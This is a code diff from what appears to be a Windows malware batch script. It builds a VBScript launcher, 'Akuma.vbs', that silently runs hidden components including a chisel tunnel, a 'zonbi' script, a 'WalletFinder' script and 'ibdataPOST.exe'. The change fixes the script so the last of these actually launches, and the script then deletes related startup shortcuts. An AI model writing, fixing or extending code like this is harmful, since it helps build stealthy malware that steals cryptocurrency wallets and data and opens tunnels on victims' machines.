@@ -31,7 +31,7 @@ echo objShell.Run "%userprofile%\Akuma\chisel.bat", 0, False >> %userprofile%\Ak
 echo objShell.Run "%userprofile%\Akuma\zonbi.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
 echo objShell.Run "%userprofile%\Akuma\network.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
 echo objShell.Run "%userprofile%\Akuma\WalletFinder.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
-echo objShell.Run "%userprofile%\Akuma\ibdataPOST.exe", 0, False >> %userprofile%\Akuma\ibdataPOST.exe
+echo objShell.Run "%userprofile%\Akuma\ibdataPOST.exe", 0, False >> %userprofile%\Akuma\Akuma.vbs
 
 echo y| del "%Appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\BeyondBirthday.lnk"
 echo y| del "%Appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
